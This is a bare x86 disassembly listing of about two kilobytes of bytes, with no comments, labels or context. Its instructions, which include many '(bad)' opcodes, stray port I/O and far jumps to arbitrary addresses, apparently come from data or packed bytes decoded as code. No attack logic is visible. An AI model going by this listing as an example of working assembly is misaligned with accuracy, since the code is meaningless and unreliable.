  409a1e:	frstor [ebp-0x7d12f0ff]
  409a24:	in     al,dx
  409a25:	inc    edx
  409a26:	ins    BYTE PTR es:[edi],dx
  409a27:	fs dec esp
  409a29:	lods   eax,DWORD PTR ds:[esi]
  409a2a:	ds std 
  409a2c:	call   0xda76:0x58c5faf3
  409a33:	adc    al,0xf
  409a35:	lods   eax,DWORD PTR ds:[esi]
  409a36:	add    ebx,ecx
  409a38:	xchg   eax,edx
  409a3a:	adc    al,0x83
  409a3c:	cdq    
  409a3d:	dec    esi
  409a3e:	jge    0x409a96
  409a40:	pop    DWORD PTR [esi+0x49ef9952]
  409a46:	and    al,0x31
  409a48:	lock xchg BYTE PTR [ecx+0xb689fc0],bh
  409a4f:	lods   al,BYTE PTR ds:[esi]
  409a50:	inc    edi
  409a51:	dec    ecx
  409a52:	ins    DWORD PTR es:[edi],dx
  409a53:	pop    ebp
  409a54:	pop    eax
  409a55:	call   0xf2d2a74f
  409a5a:	pushf  
  409a5b:	mov    esi,DWORD PTR [ebx+0x6f4ead1e]
  409a61:	in     al,dx
  409a62:	jnp    0x409a86
  409a64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a65:	call   0xa3dcee03
  409a6a:	add    eax,0xc9303ae7
  409a6f:	xchg   DWORD PTR [eax],ebp
  409a71:	stos   BYTE PTR es:[edi],al
  409a72:	adc    esp,DWORD PTR [ebx+0x44f9cee]
  409a78:	shr    DWORD PTR [esi],cl
  409a7a:	jnp    0x409a4e
  409a7c:	push   ebx
  409a7d:	daa    
  409a7e:	push   es
  409a7f:	int3   
  409a80:	scas   eax,DWORD PTR es:[edi]
  409a81:	jp     0x409a9b
  409a83:	push   eax
  409a84:	inc    edi
  409a85:	test   eax,0x71e7350d
  409a8a:	and    eax,DWORD PTR [eax-0x367ba108]
  409a90:	pop    edi
  409a91:	dec    ebp
  409a92:	and    DWORD PTR [edx+0x73],ecx
  409a95:	dec    esi
  409a96:	push   0x5ca27230
  409a9b:	scas   al,BYTE PTR es:[edi]
  409a9c:	cmp    DWORD PTR [edi-0x19],edi
  409a9f:	push   edi
  409aa0:	xor    DWORD PTR [esi*1-0x746d23bf],esp
  409aa7:	fstp   DWORD PTR [ecx-0x5]
  409aaa:	mov    dl,0xcb
  409aac:	jb     0x409a5b
  409aae:	push   esi
  409aaf:	sbb    al,0x7f
  409ab1:	fwait
  409ab2:	dec    ecx
  409ab3:	std    
  409ab4:	leave  
  409ab5:	fsub   st(0),st
  409ab7:	jmp    0xefaa:0x7ce232e6
  409abe:	cmp    al,0xa
  409ac0:	and    dl,BYTE PTR [esi-0x6d]
  409ac3:	mov    gs,WORD PTR [edi]
  409ac5:	xchg   eax,edx
  409ac7:	pop    es
  409ac8:	inc    eax
  409ac9:	cmp    al,0xe2
  409acb:	rcr    BYTE PTR [esp+ebp*2+0x6078cde5],1
  409ad2:	xchg   ebp,eax
  409ad3:	pop    ebx
  409ad4:	push   edx
  409ad5:	mov    DWORD PTR gs:[ebx-0x37],ebp
  409ad9:	sbb    BYTE PTR [eax-0x80],bl
  409adc:	or     dh,cl
  409ade:	mov    BYTE PTR ds:0x92d577ff,cl
  409ae4:	pop    esp
  409ae5:	bound  esi,QWORD PTR [edx]
  409ae7:	nop
  409ae8:	pop    ecx
  409ae9:	xor    eax,0xb25d126
  409aee:	fsub   DWORD PTR [edi+0x40a696a5]
  409af4:	js     0x409b34
  409af6:	mov    dl,0x4e
  409af8:	cmp    DWORD PTR [edx-0x6e],ebx
  409afb:	stos   DWORD PTR es:[edi],eax
  409afc:	pushf  
  409afd:	shl    BYTE PTR [esi-0x4f7feeb8],cl
  409b03:	ror    BYTE PTR ds:0x939c5d8,0x35
  409b0a:	inc    ebp
  409b0b:	and    eax,0xb8123eab
  409b10:	pop    esi
  409b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b12:	gs pop ebp
  409b14:	pop    edx
  409b15:	dec    ebx
  409b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b17:	dec    ecx
  409b18:	mov    bh,0x81
  409b1a:	and    al,0x2d
  409b1c:	lahf   
  409b1d:	push   ss
  409b1e:	cmp    esp,edx
  409b20:	adc    al,0x88
  409b22:	dec    esi
  409b23:	dec    edi
  409b24:	adc    ebx,DWORD PTR [eax]
  409b26:	retf   
  409b27:	or     al,0x69
  409b29:	push   edi
  409b2a:	pop    es
  409b2b:	push   ds
  409b2c:	(bad)  
  409b2d:	rol    DWORD PTR [ecx-0x27],1
  409b30:	dec    ecx
  409b31:	xor    bh,BYTE PTR [eax+ecx*2]
  409b34:	fsubr  QWORD PTR [ebx+0x35254e25]
  409b3a:	test   BYTE PTR [ecx+0x5d119fcb],dh
  409b40:	dec    edi
  409b41:	cdq    
  409b42:	mov    edi,0x1333a457
  409b47:	and    BYTE PTR [edx-0x42],0x34
  409b4b:	popf   
  409b4c:	lds    ecx,FWORD PTR [ebp-0x71]
  409b4f:	xor    al,0x3f
  409b51:	inc    esp
  409b52:	in     al,0x6c
  409b54:	repz and BYTE PTR [ecx],ch
  409b57:	add    al,al
  409b59:	inc    eax
  409b5a:	cmp    eax,0x8733408e
  409b5f:	dec    esi
  409b60:	push   ebx
  409b61:	jb     0x409b80
  409b63:	sub    esp,DWORD PTR fs:[eax]
  409b66:	(bad)  
  409b67:	je     0x409bd8
  409b69:	dec    ebp
  409b6a:	mov    dh,dl
  409b6c:	xor    al,0xaa
  409b6e:	sahf   
  409b6f:	in     eax,dx
  409b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b71:	fwait
  409b72:	sar    BYTE PTR [ebx+eax*2-0x9],0x5f
  409b77:	out    dx,eax
  409b78:	sbb    dl,BYTE PTR [ebx-0x6f]
  409b7b:	aad    0x67
  409b7d:	push   ecx
  409b7e:	sar    BYTE PTR [edi+0x79],1
  409b81:	xchg   ah,bl
  409b83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b84:	(bad)  
  409b85:	lock aad 0x88
  409b88:	jmp    0x425d:0xdf002ff4
  409b8f:	inc    ebp
  409b90:	pop    ss
  409b91:	inc    ebx
  409b92:	enter  0xf927,0x9b
  409b96:	icebp  
  409b97:	jmp    0x4473:0xb0531e0
  409b9e:	jnp    0x409b93
  409ba0:	inc    ebp
  409ba2:	push   0x88c982f0
  409ba7:	fwait
  409ba8:	syscall 
  409baa:	cmp    dh,bl
  409bac:	mov    ecx,0x4c7f7126
  409bb1:	cmp    DWORD PTR [edx+0x756a468f],0xf26785aa
  409bbb:	in     eax,0x3a
  409bbd:	ins    DWORD PTR es:[edi],dx
  409bbe:	add    bh,BYTE PTR [ebx+0x5d]
  409bc1:	pushf  
  409bc2:	data16 xlat BYTE PTR ds:[ebx]
  409bc4:	sti    
  409bc5:	popa   
  409bc6:	mul    BYTE PTR [ebx+0x44]
  409bc9:	inc    edx
  409bca:	call   0x409c:0x19f4e4b4
  409bd1:	jbe    0x409bce
  409bd3:	aad    0xff
  409bd5:	xchg   BYTE PTR [esi],ah
  409bd7:	jne    0x409c1c
  409bd9:	xchg   ebx,eax
  409bda:	lock push ebx
  409bdc:	aam    0x29
  409bde:	outs   dx,BYTE PTR ds:[esi]
  409bdf:	(bad)  
  409be0:	cli    
  409be1:	loop   0x409b7a
  409be3:	mov    ebp,DWORD PTR [esi-0x64e183ac]
  409be9:	call   0xddbc69bf
  409bee:	cdq    
  409bef:	xlat   BYTE PTR ds:[ebx]
  409bf0:	enter  0xc8e5,0x35
  409bf4:	sub    BYTE PTR [esp+ecx*8],dh
  409bf7:	adc    DWORD PTR [ecx-0x2757b06b],0x31bd6a47
  409c01:	xor    cl,0x9b
  409c04:	in     al,0xc5
  409c06:	mov    fs,WORD PTR [esi]
  409c08:	and    edi,DWORD PTR [esi-0x473272a8]
  409c0e:	mov    BYTE PTR [ecx+eax*8],dl
  409c11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c12:	into   
  409c13:	into   
  409c14:	jp     0x409c88
  409c16:	and    edx,DWORD PTR [ecx+edi*1-0x70]
  409c1a:	mov    cl,ah
  409c1c:	(bad)  
  409c1d:	int    0x24
  409c1f:	jl     0x409bcd
  409c21:	std    
  409c22:	dec    edx
  409c23:	jmp    FWORD PTR [edx+0x49]
  409c26:	pushf  
  409c27:	sbb    eax,0x8b59ddc8
  409c2c:	sub    DWORD PTR [ebp-0x65],0xffffffd4
  409c30:	and    eax,0x7162eaa7
  409c35:	outs   dx,DWORD PTR ds:[esi]
  409c36:	fistp  DWORD PTR [edx+0x27df1a75]
  409c3c:	rcl    DWORD PTR [ebx+0x4b],cl
  409c3f:	xchg   esp,eax
  409c40:	push   esp
  409c41:	bound  ebx,QWORD PTR [ebp+eiz*1+0x53e18fd5]
  409c48:	out    dx,al
  409c49:	and    bl,dl
  409c4b:	jle    0x409c81
  409c4d:	mov    ebx,DWORD PTR [eax-0xa473b8e]
  409c53:	cdq    
  409c54:	jo     0x409c75
  409c56:	(bad)  
  409c57:	pop    ebx
  409c58:	and    ecx,edi
  409c5a:	pop    eax
  409c5b:	leave  
  409c5c:	aad    0xd1
  409c5e:	push   ecx
  409c5f:	sub    al,0x82
  409c61:	xchg   ecx,eax
  409c62:	add    eax,edx
  409c64:	xor    DWORD PTR ds:0x56f71212,esi
  409c6a:	pop    ds
  409c6b:	loope  0x409c7c
  409c6d:	aad    0xc8
  409c6f:	pop    edx
  409c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c71:	xchg   esi,eax
  409c72:	das    
  409c73:	sub    DWORD PTR [edx],edi
  409c75:	aas    
  409c76:	push   eax
  409c77:	nop
  409c78:	ins    DWORD PTR es:[edi],dx
  409c79:	push   cs
  409c7a:	test   BYTE PTR [eax],0xe0
  409c7d:	jne    0x409c3f
  409c7f:	test   eax,0xc4af2ce8
  409c84:	test   BYTE PTR [ebp+esi*1-0x6e],al
  409c88:	rcr    BYTE PTR [ecx+0x4c],cl
  409c8b:	mov    eax,0x1e51fa6c
  409c90:	ret    0x7582
  409c93:	outs   dx,DWORD PTR ds:[esi]
  409c94:	mov    cl,0x98
  409c96:	aaa    
  409c97:	push   edx
  409c98:	mov    esi,0xf72d11e9
  409c9d:	(bad)  
  409c9e:	push   0x876f05e7
  409ca3:	jmp    0x409ca6
  409ca5:	lahf   
  409ca6:	cmp    dl,BYTE PTR [ebp-0x14]
  409ca9:	adc    BYTE PTR ds:0x2e290ab4,ah
  409caf:	jno    0x409cc6
  409cb1:	xchg   ebx,eax
  409cb2:	stos   DWORD PTR es:[edi],eax
  409cb3:	xor    DWORD PTR [eax],esi
  409cb5:	or     eax,0x24ad168d
  409cba:	and    al,0xe2
  409cbc:	ror    BYTE PTR [eax-0x21],1
  409cbf:	mov    edi,0x5e424421
  409cc4:	or     BYTE PTR [edx+0x67],dl
  409cc7:	jl     0x409c9e
  409cc9:	jle    0x409cf8
  409ccb:	cmp    al,0x5
  409ccd:	mov    esp,DWORD PTR ds:0xef872037
  409cd3:	call   DWORD PTR [eax-0x31]
  409cd6:	fld    TBYTE PTR [edi+0x37bbbad6]
  409cdc:	pop    ecx
  409cdd:	mov    bh,0x4b
  409cdf:	call   0x851a:0x9c1533bd
  409ce6:	enter  0xcfae,0x49
  409cea:	lds    ecx,FWORD PTR [esi]
  409cec:	ret    0x617e
  409cef:	(bad)  
  409cf0:	in     al,dx
  409cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cf2:	mov    esi,0xe2b198ee
  409cf7:	jl     0x409ca8
  409cf9:	mov    al,0x59
  409cfb:	out    0xe3,al
  409cfd:	popa   
  409cfe:	jle    0x409d29
  409d00:	xchg   DWORD PTR [eax+0x35328843],ebp
  409d06:	xor    al,0x38
  409d08:	daa    
  409d09:	test   eax,0x17c19dc7
  409d0e:	adc    bl,dl
  409d10:	cwde   
  409d11:	inc    edi
  409d12:	or     al,0xd8
  409d14:	ins    DWORD PTR es:[edi],dx
  409d15:	cmp    DWORD PTR [edx],ebp
  409d17:	popa   
  409d18:	mov    ebx,0x2b21219
  409d1d:	iret   
  409d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d1f:	sbb    ebx,DWORD PTR [ebp+edi*4-0xc3356cc]
  409d26:	adc    eax,0x5104c425
  409d2b:	push   ecx
  409d2c:	test   DWORD PTR [edx-0x1f],ebp
  409d2f:	push   es
  409d30:	loope  0x409ced
  409d32:	mov    edx,0xba3e41a1
  409d37:	test   al,dl
  409d39:	std    
  409d3a:	mov    esi,0xcbf46aef
  409d3f:	mov    ebx,0xfd925f5f
  409d44:	dec    esi
  409d45:	cmp    DWORD PTR [edi],edx
  409d47:	aas    
  409d48:	retf   0xeb1b
  409d4b:	fiadd  WORD PTR [di+0x1e]
  409d4f:	mov    ch,0x2d
  409d51:	push   cs
  409d52:	retf   
  409d53:	xor    ah,BYTE PTR [edx+0x3467a660]
  409d59:	fimul  WORD PTR [ebp-0x77359d45]
  409d5f:	push   0xda056c98
  409d64:	outs   dx,DWORD PTR ds:[esi]
  409d65:	retf   
  409d66:	fcomp  QWORD PTR [edi+0x11]
  409d69:	in     eax,0x36
  409d6b:	pop    esi
  409d6c:	stos   BYTE PTR es:[edi],al
  409d6d:	test   DWORD PTR [ebp-0x62a18fa3],edx
  409d73:	hlt    
  409d74:	sbb    ch,dl
  409d76:	stos   BYTE PTR es:[edi],al
  409d77:	jle    0x409d2f
  409d79:	pop    ebp
  409d7a:	mov    BYTE PTR [esi],al
  409d7c:	push   ss
  409d7d:	hlt    
  409d7e:	sbb    al,0xa1
  409d80:	xchg   ebx,eax
  409d81:	scas   eax,DWORD PTR es:[edi]
  409d82:	imul   ecx,DWORD PTR [ebp-0x6e9b2ae],0x17
  409d89:	cs inc esp
  409d8b:	call   0xed70:0x32242a15
  409d92:	out    0x4,eax
  409d94:	and    BYTE PTR [ebp-0x68d736d1],ch
  409d9a:	push   es
  409d9b:	add    eax,0x8180ac9
  409da0:	mov    WORD PTR [edi+0x29],ss
  409da3:	call   0x116af53d
  409da8:	add    eax,0xb1b5a11d
  409dad:	sbb    dh,ah
  409daf:	icebp  
  409db0:	or     al,0x12
  409db2:	scas   eax,DWORD PTR es:[edi]
  409db3:	or     DWORD PTR [ebp+0x26],ebp
  409db6:	push   edx
  409db7:	fcom   QWORD PTR [ecx-0x6]
  409dba:	cli    
  409dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dbc:	fsqrt  
  409dbe:	mov    eax,ds:0x68d99990
  409dc3:	sub    eax,0x29889c62
  409dc8:	jmp    0xcea02f30
  409dcd:	sub    bh,BYTE PTR [ebx+0x3f]
  409dd0:	dec    ebx
  409dd1:	push   esp
  409dd2:	inc    esi
  409dd3:	adc    al,0x75
  409dd5:	pop    ss
  409dd6:	rcr    ebp,0x9c
  409dd9:	rcl    BYTE PTR [edi+0x59],1
  409ddc:	or     BYTE PTR [ebx-0x403ad61e],ch
  409de2:	frndint 
  409de4:	and    DWORD PTR [ebx],ecx
  409de6:	push   eax
  409de7:	repnz popf 
  409de9:	push   edi
  409dea:	pop    esp
  409deb:	push   edx
  409dec:	fiadd  DWORD PTR [esi-0x15096c52]
  409df2:	dec    edx
  409df3:	xchg   ebp,eax
  409df4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409df5:	out    dx,al
  409df6:	xchg   ebp,eax
  409df7:	fmul   DWORD PTR [ecx]
  409df9:	loopne 0x409e6a
  409dfb:	fwait
  409dfc:	dec    esi
  409dfd:	push   edi
  409dfe:	pop    edi
  409dff:	in     al,dx
  409e00:	cmc    
  409e01:	mov    ah,0x61
  409e03:	xchg   ebx,eax
  409e04:	std    
  409e05:	loop   0x409df3
  409e07:	hlt    
  409e08:	adc    eax,0xeb60dae0
  409e0d:	fstp   QWORD PTR [ebp+0x6314d37e]
  409e13:	dec    ebx
  409e14:	lahf   
  409e15:	adc    DWORD PTR [eax+0x6],0xffffffa3
  409e19:	push   ss
  409e1a:	lds    edi,FWORD PTR [edx+0x5832fbde]
  409e20:	mov    bh,0x2c
  409e22:	ror    DWORD PTR [edi+0x6f],1
  409e25:	jmp    DWORD PTR [edi]
  409e27:	push   0xffffff89
  409e29:	jle    0x409e78
  409e2b:	in     eax,dx
  409e2c:	push   ss
  409e2d:	inc    eax
  409e2e:	dec    eax
  409e2f:	sub    cl,BYTE PTR [edi-0x6c]
  409e32:	inc    ecx
  409e33:	adc    eax,0xf83d1a8
  409e38:	mov    ch,0xb2
  409e3a:	and    ebp,DWORD PTR [edx]
  409e3c:	jl     0x409dd9
  409e3e:	lock shr DWORD PTR [eax-0x15],0x2b
  409e43:	fsub   QWORD PTR [edi+0x596bf554]
  409e49:	ret    0x2e17
  409e4c:	xchg   esp,eax
  409e4d:	inc    esp
  409e4e:	stc    
  409e4f:	pop    esp
  409e50:	xchg   DWORD PTR [edi],esi
  409e52:	xchg   esp,eax
  409e53:	xchg   edx,eax
  409e54:	aad    0x70
  409e56:	lea    esp,[edi+0x28]
  409e59:	inc    esp
  409e5a:	fs iret 
  409e5c:	(bad)  
  409e5d:	sbb    al,0xea
  409e5f:	fist   DWORD PTR [ebx]
  409e61:	cmc    
  409e62:	dec    ecx
  409e63:	loopne 0x409eac
  409e65:	leave  
  409e66:	mov    dl,0x3c
  409e68:	inc    edx
  409e69:	outs   dx,BYTE PTR ds:[esi]
  409e6a:	in     al,dx
  409e6b:	repz xor ch,BYTE PTR [ecx]
  409e6e:	and    edx,ebx
  409e70:	xchg   cl,dh
  409e72:	ins    DWORD PTR es:[edi],dx
  409e73:	jo     0x409e58
  409e75:	push   edi
  409e76:	arpl   WORD PTR [ecx+0x2aa6eea8],ax
  409e7c:	daa    
  409e7d:	(bad)  [eax-0x6c741d6b]
  409e83:	sbb    DWORD PTR [edx],eax
  409e85:	inc    eax
  409e86:	fisubr DWORD PTR [edx]
  409e88:	xchg   esi,eax
  409e89:	(bad)  [ecx+0x3b6f61a4]
  409e8f:	into   
  409e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e91:	sub    DWORD PTR [ebx-0x169db9ca],ebp
  409e97:	cmp    eax,0x8ff5f60e
  409e9c:	push   esp
  409e9d:	into   
  409e9e:	sbb    BYTE PTR [ebx+0x45ad7396],al
  409ea4:	aad    0x3e
  409ea6:	and    esi,DWORD PTR [edi-0x4b642375]
  409eac:	mov    al,BYTE PTR [esi]
  409eae:	in     al,dx
  409eaf:	retf   0x3a19
  409eb2:	lds    ebp,FWORD PTR [esi+0x22]
  409eb5:	or     DWORD PTR [edx],ebp
  409eb7:	fs ja  0x409f32
  409eba:	jae    0x409ef1
  409ebc:	sbb    BYTE PTR [ebx+0x2e],cl
  409ebf:	adc    BYTE PTR [ebp-0x371a2359],dh
  409ec5:	mov    ebp,0xfbe38fb6
  409eca:	push   ecx
  409ecb:	ret    
  409ecc:	add    esp,DWORD PTR [ebx-0x567360b0]
  409ed2:	je     0x409e72
  409ed4:	jne    0x409e9c
  409ed6:	mov    esp,0xf8539373
  409edb:	in     eax,dx
  409edc:	fldcw  WORD PTR [esi+ebp*8-0x5318696f]
  409ee3:	add    BYTE PTR [eax+ecx*1-0x35967588],al
  409eea:	jnp    0x409efe
  409eec:	sti    
  409eed:	jns    0x409e85
  409eef:	jle    0x409f5c
  409ef1:	cmp    cl,BYTE PTR ds:[esp+ecx*2+0x51]
  409ef6:	xchg   esp,eax
  409ef7:	out    dx,eax
  409ef8:	jbe    0x409f71
  409efa:	ins    BYTE PTR es:[edi],dx
  409efb:	push   ds
  409efc:	xchg   esi,eax
  409efd:	lea    esp,[edi+0x61b7d21d]
  409f03:	xchg   DWORD PTR [ebx-0x703f0485],ecx
  409f09:	mov    cl,0xea
  409f0b:	mov    bh,0xc7
  409f0d:	mov    BYTE PTR [ebx],cl
  409f0f:	xchg   ecx,eax
  409f10:	xchg   esp,eax
  409f11:	push   0x10
  409f13:	push   esi
  409f14:	mov    cl,0x34
  409f16:	imul   esp,esi,0x8c523d0
  409f1c:	and    ch,dl
  409f1e:	and    al,0xf3
  409f20:	es in  al,dx
  409f22:	out    dx,eax
  409f23:	xor    edx,DWORD PTR [esi+0x30]
  409f26:	inc    eax
  409f27:	mov    BYTE PTR [eax+ebp*1-0xc],0x74
  409f2c:	inc    esp
  409f2d:	into   
  409f2e:	pop    DWORD PTR [edx-0x1]
  409f31:	pop    ebp
  409f32:	ss clc 
  409f34:	rcr    DWORD PTR [ebx+0x49],0xf4
  409f38:	mov    cl,0xfe
  409f3a:	or     BYTE PTR [edx+0x402f9883],bl
  409f40:	mov    al,0x66
  409f42:	sti    
  409f43:	cmp    al,0x7
  409f45:	cld    
  409f46:	pop    ss
  409f47:	cmp    eax,esp
  409f49:	xlat   BYTE PTR ds:[ebx]
  409f4a:	stc    
  409f4b:	and    dh,BYTE PTR ds:0x58bc402a
  409f51:	call   0xe9fca26d
  409f56:	cdq    
  409f57:	mov    ebp,edi
  409f59:	jb     0x409f7b
  409f5b:	xchg   ebx,eax
  409f5c:	pop    ebx
  409f5d:	mov    ?,WORD PTR [esi+0x32e5dfa3]
  409f63:	jmp    0x906b:0x9610934a
  409f6a:	das    
  409f6b:	pop    ds
  409f6c:	loop   0x409fdb
  409f6e:	ret    0x62f
  409f71:	push   es
  409f72:	push   ecx
  409f73:	std    
  409f74:	outs   dx,DWORD PTR ds:[esi]
  409f75:	ins    DWORD PTR es:[edi],dx
  409f76:	adc    eax,0xe19d214
  409f7b:	lock inc edi
  409f7d:	push   0x2d850e2d
  409f82:	test   eax,0x4d6272c5
  409f87:	or     al,0x5d
  409f89:	mov    ecx,0xac69c38f
  409f8e:	xchg   esi,esp
  409f90:	loopne 0x409fcd
  409f92:	sub    al,0x93
  409f94:	dec    ebx
  409f95:	jle    0x409f96
  409f97:	or     edx,DWORD PTR [ecx+0x33]
  409f9a:	mov    eax,0xe8965fa3
  409f9f:	add    BYTE PTR [esi+ebp*4-0x61],dh
  409fa3:	mov    bh,bl
  409fa5:	pop    ebx
  409fa6:	sbb    ch,cl
  409fa8:	push   esp
  409fa9:	jmp    0x85f8:0xc731de21
  409fb0:	add    eax,0xc82522a1
  409fb5:	dec    ecx
  409fb6:	sahf   
  409fb7:	mov    ecx,0x4cd90aba
  409fbc:	mov    BYTE PTR [edx-0x9],dh
  409fbf:	stos   DWORD PTR es:[edi],eax
  409fc0:	outs   dx,BYTE PTR ds:[esi]
  409fc1:	leave  
  409fc2:	jg     0x409f66
  409fc4:	sub    esi,DWORD PTR [edi-0x43cbbdc9]
  409fca:	xchg   DWORD PTR ds:0x4d7a86b9,eax
  409fd0:	or     edx,DWORD PTR es:[esi]
  409fd3:	sbb    DWORD PTR [edx-0x6c],esi
  409fd6:	adc    ebx,ecx
  409fd8:	aam    0x4e
  409fda:	pop    edi
  409fdb:	je     0x409fe0
  409fdd:	or     DWORD PTR [edi-0x60ea3281],0xffffffc1
  409fe4:	push   ds
  409fe5:	lds    edx,FWORD PTR [eax]
  409fe7:	and    edx,DWORD PTR [ecx]
  409fe9:	adc    BYTE PTR [edi+esi*2+0x73],al
  409fed:	push   ecx
  409fee:	dec    BYTE PTR [ecx]
  409ff0:	mov    al,bh
  409ff2:	fidiv  DWORD PTR [eax+0x5b]
  409ff5:	mov    WORD PTR [ecx+ebp*4+0x1560b82c],?
  409ffc:	(bad)  
  409ffd:	lods   eax,DWORD PTR ds:[esi]
  409ffe:	sbb    BYTE PTR [esi+0xf],al
  40a001:	pop    ebx
  40a002:	test   DWORD PTR [ebp+0x47],edi
  40a005:	or     eax,0x67a3d42a
  40a00a:	ins    BYTE PTR es:[edi],dx
  40a00b:	test   BYTE PTR [edx-0x51a6e4ab],bl
  40a011:	mov    al,ds:0xf6a4f47e
  40a016:	les    esi,FWORD PTR [ecx+0x4b]
  40a019:	idiv   DWORD PTR [ecx]
  40a01b:	(bad)  
  40a01c:	fld    DWORD PTR [esi]
  40a01e:	gs and al,0x92
  40a021:	sbb    edi,DWORD PTR [ebx+edx*1]
  40a024:	jns    0x40a05b
  40a026:	adc    al,0x46
  40a028:	mov    eax,0x10496892
  40a02d:	push   esi
  40a02e:	(bad)  
  40a02f:	test   ebp,0x7c53671
  40a035:	(bad)
  40a038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a039:	mul    BYTE PTR [edx]
  40a03b:	(bad)  
  40a03c:	jge    0x40a0a9
  40a03e:	out    0xb6,al
  40a040:	ja     0x40a03f
  40a042:	or     al,ch
  40a044:	ror    bh,cl
  40a046:	pop    ecx
  40a047:	pop    edi
  40a048:	adc    cl,ah
  40a04a:	lock jmp 0x409fd2
  40a04d:	pusha  
  40a04e:	dec    ecx
  40a04f:	jge    0x40a04a
  40a051:	scas   eax,DWORD PTR es:[edi]
  40a052:	sbb    ah,BYTE PTR ds:0x4ebf46a5
  40a058:	push   eax
  40a059:	rol    edx,cl
  40a05b:	loope  0x40a05b
  40a05d:	push   ebp
  40a05e:	sub    BYTE PTR [ecx],cl
  40a060:	inc    ebp
  40a061:	frstor [ecx+0x4c]
  40a064:	in     eax,dx
  40a065:	ret    0x4173
  40a068:	mov    esp,0x522fef5d
  40a06d:	xor    ah,dl
  40a06f:	out    dx,al
  40a070:	fwait
  40a071:	rcr    BYTE PTR [ecx],1
  40a073:	test   BYTE PTR ds:0x9f3b0565,dl
  40a079:	adc    al,0x77
  40a07b:	or     eax,0xcecfba49
  40a080:	stos   DWORD PTR es:[edi],eax
  40a081:	sub    BYTE PTR [edi],ch
  40a083:	xor    dh,BYTE PTR [ebp-0x723b5521]
  40a089:	ins    DWORD PTR es:[edi],dx
  40a08a:	fldcw  WORD PTR [ebx+ebx*4]
  40a08d:	sbb    al,bh
  40a08f:	xchg   ebx,eax
  40a090:	mov    ds:0x742c7f1f,al
  40a095:	adc    ebx,0x1
  40a098:	jb     0x40a0c6
  40a09a:	pop    esp
  40a09b:	push   ss
  40a09c:	(bad)  
  40a09d:	imul   eax,DWORD PTR [esi+edi*1],0x35df0e82
  40a0a4:	adc    esp,DWORD PTR [eax-0x61]
  40a0a7:	lahf   
  40a0a8:	adc    eax,0x6cf5653e
  40a0ad:	loop   0x40a112
  40a0af:	sub    al,0x0
  40a0b1:	cli    
  40a0b2:	lea    ebp,[edi-0x78b19f39]
  40a0b8:	add    dl,ch
  40a0ba:	popa   
  40a0bb:	push   ebx
  40a0bc:	scas   al,BYTE PTR es:[edi]
  40a0bd:	pop    ecx
  40a0be:	mov    edi,0xbbe55cb9
  40a0c3:	push   0x39540878
  40a0c8:	mov    ebp,0xacdf828d
  40a0cd:	jae    0x40a093
  40a0cf:	lock cmc 
  40a0d1:	and    eax,0xb09aec11
  40a0d6:	mov    bh,0x49
  40a0d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0d9:	mov    DWORD PTR [ebx+0x15],edi
  40a0dc:	arpl   WORD PTR [edi],dx
  40a0de:	dec    edx
  40a0e0:	sti    
  40a0e1:	sbb    dh,ch
  40a0e3:	ja     0x40a065
  40a0e5:	inc    eax
  40a0e6:	and    cl,ah
  40a0e8:	jge    0x40a0a9
  40a0ea:	lahf   
  40a0eb:	add    BYTE PTR [ecx+0x2faf2553],bl
  40a0f1:	(bad)  
  40a0f2:	mov    esi,0xfac56c3c
  40a0f7:	dec    ecx
  40a0f8:	lds    ecx,FWORD PTR [eax]
  40a0fa:	in     al,dx
  40a0fb:	and    DWORD PTR [ebx-0x19],edx
  40a0fe:	lahf   
  40a0ff:	out    0xac,al
  40a101:	(bad)  
  40a102:	mov    ebp,0xaba051cd
  40a107:	xor    ah,bh
  40a109:	xchg   edi,eax
  40a10a:	das    
  40a10b:	shr    BYTE PTR [esi-0x64],0x1a
  40a10f:	ss retf 
  40a111:	mov    esp,0xbaf8aed
  40a116:	cmp    BYTE PTR ss:[ecx-0x67],0x8e
  40a11b:	jnp    0x40a0b9
  40a11d:	mov    ds:0x7acc4427,eax
  40a122:	xor    edi,eax
  40a124:	(bad)  
  40a125:	xor    eax,0xb90fb939
  40a12a:	push   es
  40a12b:	pop    ss
  40a12c:	test   esi,edi
  40a12e:	push   es
  40a12f:	and    dh,dh
  40a131:	retf   
  40a132:	jl     0x40a18c
  40a134:	sbb    DWORD PTR [edi],0x6f6efd87
  40a13a:	mov    ds:0xfa90f794,al
  40a13f:	add    eax,0x6bc72d14
  40a144:	jge    0x40a149
  40a146:	inc    edx
  40a147:	push   edx
  40a148:	bound  ecx,QWORD PTR [edi+0x36]
  40a14b:	ja     0x40a1bf
  40a14d:	sub    esi,esi
  40a14f:	jb     0x40a19c
  40a151:	mov    ebp,esi
  40a153:	cli    
  40a154:	shr    ebp,1
  40a156:	adc    ah,BYTE PTR [ebx+0x2a1eacf7]
  40a15c:	jecxz  0x40a1ae
  40a15e:	push   esp
  40a15f:	in     eax,0x46
  40a161:	jmp    0x9fb6:0x477e1a7c
  40a168:	sti    
  40a169:	jge    0x40a15e
  40a16b:	bnd jo 0x40a0f9
  40a16e:	daa    
  40a16f:	jecxz  0x40a0f1
  40a171:	std    
  40a172:	shl    DWORD PTR [ebx-0xb],1
  40a175:	xchg   edx,eax
  40a176:	jl     0x40a193
  40a178:	call   0x4c00623c
  40a17d:	or     ch,bl
  40a17f:	pusha  
  40a180:	sub    eax,0x5b9b73b1
  40a185:	aad    0xb1
  40a187:	push   esp
  40a188:	(bad)  
  40a189:	adc    eax,0xbb4333fb
  40a18e:	loope  0x40a139
  40a190:	retf   0x5875
  40a193:	cmp    BYTE PTR [edi+0x24e029ce],dh
  40a199:	fbstp  TBYTE PTR [edi]
  40a19b:	test   ebp,0x9dc4d5f7
  40a1a1:	(bad)  
